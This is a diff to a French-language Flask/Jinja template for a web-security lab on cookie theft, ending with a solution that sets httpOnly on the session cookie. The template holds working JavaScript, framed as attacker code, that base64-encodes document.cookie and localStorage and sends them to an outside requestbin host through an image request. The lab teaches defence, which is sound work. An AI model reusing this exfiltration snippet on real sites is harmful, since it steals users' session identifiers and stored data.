@@ -3,12 +3,16 @@
 {% block head %}
 {{ super() }}
 <script>
+  // L'attaquant a trouvé une faille et a été capable d'ajouter son code malveillant
+  // lui permettant de lire les cookies de vos utilisateurs.
+  // Empêchez-le de lire le cookie en configurant le bon paramètre dans l'en-tête Set-Cookie
   function steal_my_cookie() {
     cookie = btoa(document.cookie);
     const img = document.createElement("img");
-    img.setAttribute("src", "http://attack.host/info?q=" + cookie);
+    img.setAttribute("src", "http://dnsdatacheck.wazso92hlbpongnq.b.requestbin.net/?q=" + cookie);
     document.body.appendChild(img);
   }
+  // Pouvez-vous l'empêcher d'accéder au localstorage de vos utilisateurs grâce aux en-têtes HTTP?
   function steal_my_storage() {
     storage = btoa(localStorage.getItem('key'));
     const img = document.createElement("img");
@@ -21,6 +25,7 @@
       .then((value) => localStorage.setItem("key", value.random));
   }
   populate_local_storage();
+  // Fin du code de l'attaquant
 </script>
 {% endblock %}
 {% block content %}
@@ -28,8 +33,11 @@
 
 <p>
   Votre site a été piraté. Un attaquant a inclus du contenu javascript qui lui permet de voler
-  votre identifiant de session.
+  votre identifiant de session. Si vous regardez les sources de la page, vous verrez le code
+  injecté par l'attaquant.
+</p>
 
+<p>
   Ouvrez la console de développeur de votre navigateur et observez les requêtes produites
   lorsque vous cliquez sur les boutons:
 </p>
@@ -44,12 +52,36 @@
 </p>
 
 <p>
-<h2>TODO</h2>
-Corrigez le problème en modifiant la méthode <code>cookie_stealing</code> dans le fichier unsecure.py
+<h2>Votre TODO-list</h2>
+<ul>
+  <li>Corrigez le problème en modifiant la méthode <code>cookie_stealing</code> dans le fichier unsecure.py</li>
+</ul>
 </p>
+<p>
+  Vous pouvez aussi utiliser semgrep pour trouver le problème dans ce code:
+</p>
+<code>
+  docker run --rm -v "${PWD}:/src" returntocorp/semgrep semgrep scan --config="r/python.flask.security.audit.secure-set-cookie.secure-set-cookie"
+</code>
+
+
+<h2>Ressources</h2>
+<ul>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">httpOnly sur le MDN</a></li>
+  <li><a href="https://tedboy.github.io/flask/generated/generated/flask.Response.set_cookie.html">Flask httpOnly</a>
+  </li>
+</ul>
 
 {{ macro.solution("""
 Le paramètre à utiliser est <strong>httpOnly</strong>.
 Avec cette valeur, le code javascript ne peut plus accéder à document.cookie.
+<p>
+  Code Flask
+  <code style=\"display: block; white-space: pre-wrap\">
+    def cookie_stealing():
+      ...
+      response.set_cookie('SESSION_ID', str(uuid.uuid4()), httponly=True)
+  </code>
+</p>
 """)}}
 {% endblock %}
